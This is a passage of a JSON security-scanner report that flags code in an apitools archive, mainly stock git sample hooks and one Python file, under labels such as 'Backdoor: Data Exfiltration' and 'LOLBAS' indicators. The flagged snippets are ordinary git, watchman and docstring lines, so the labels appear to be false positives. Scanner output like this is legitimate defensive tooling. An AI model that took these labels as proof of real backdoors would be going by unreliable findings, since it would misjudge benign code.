                    "text": "      description: Description of this message.\n      full_name: Full qualified name of this message.\n      decorators: Decorators to include in the definition when printing.\n          Printed in the given order from top to bottom (so the last entry\n          is the innermost decorator).\n      alias_for: This type is just an alias for the named type.\n      field_mappings: Mappings from python to json field names.\n",
                    "rendered": {
                      "text": "      description: Description of this message.\n      full_name: Full qualified name of this message.\n      decorators: Decorators to include in the definition when printing.\n          Printed in the given order from top to bottom (so the last entry\n          is the innermost decorator).\n      alias_for: This type is just an alias for the named type.\n      field_mappings: Mappings from python to json field names.\n",
                      "markdown": "`      description: Description of this message.\n      full_name: Full qualified name of this message.\n      decorators: Decorators to include in the definition when printing.\n          Printed in the given order from top to bottom (so the last entry\n          is the innermost decorator).\n      alias_for: This type is just an alias for the named type.\n      field_mappings: Mappings from python to json field names.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/extended_descriptor.py"
                },
                "region": {
                  "startLine": 506,
                  "startColumn": 42,
                  "endLine": 506,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            'default_format': '',\n        }\n\n        message_field = _MESSAGE_FIELD_MAP.get(field.type_name)\n        if message_field:\n            printed_field_info['module'] = '_message_types'\n            field_type = message_field\n",
                    "rendered": {
                      "text": "            'default_format': '',\n        }\n\n        message_field = _MESSAGE_FIELD_MAP.get(field.type_name)\n        if message_field:\n            printed_field_info['module'] = '_message_types'\n            field_type = message_field\n",
                      "markdown": "`            'default_format': '',\n        }\n\n        message_field = _MESSAGE_FIELD_MAP.get(field.type_name)\n        if message_field:\n            printed_field_info['module'] = '_message_types'\n            field_type = message_field\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-merge-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 74,
                  "endLine": 74,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                    "rendered": {
                      "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                      "markdown": "`\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 2,
                  "endLine": 65,
                  "endColumn": 8,
                  "snippet": {
                    "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                    "rendered": {
                      "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                      "markdown": "`unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 54,
                  "endLine": 54,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                    "rendered": {
                      "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                      "markdown": "`\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 53,
                  "endLine": 53,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                    "rendered": {
                      "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                      "markdown": "`\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 27,
                  "endLine": 51,
                  "endColumn": 33,
                  "snippet": {
                    "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                    "rendered": {
                      "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                      "markdown": "`if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                    "rendered": {
                      "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                      "markdown": "`validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 69,
                  "endLine": 11,
                  "endColumn": 74,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"sendemail-validate\".\n#\n# By default, it will only check that the patch(es) can be applied on top of\n# the default upstream branch without conflicts in a secondary worktree. After\n# validation (successful or not) of the last patch of a series, the worktree\n# will be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to validate a patch (and/or patch series) before\n# sending it via email.\n#\n# The hook should exit with non-zero status after issuing an appropriate\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 45,
                  "endLine": 13,
                  "endColumn": 53,
                  "snippet": {
                    "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                    "rendered": {
                      "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                      "markdown": "`#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 51,
                  "endLine": 12,
                  "endColumn": 59,
                  "snippet": {
                    "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                    "rendered": {
                      "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                      "markdown": "`# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 53,
                  "endLine": 11,
                  "endColumn": 61,
                  "snippet": {
                    "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                    "rendered": {
                      "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                      "markdown": "`# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 15,
                  "endLine": 143,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                    "rendered": {
                      "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                      "markdown": "`\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 49,
                  "endLine": 141,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                    "rendered": {
                      "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                      "markdown": "`\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 30,
                  "endLine": 129,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                    "rendered": {
                      "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                      "markdown": "`\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 28,
                  "endLine": 128,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                    "rendered": {
                      "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                      "markdown": "`\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 30,
                  "endLine": 110,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                    "rendered": {
                      "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                      "markdown": "`\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 45,
                  "endLine": 8,
                  "endColumn": 50,
                  "snippet": {
                    "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                    "rendered": {
                      "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                      "markdown": "`use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 17,
                  "endLine": 7,
                  "endColumn": 25,
                  "snippet": {
                    "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                    "rendered": {
                      "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                      "markdown": "`use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
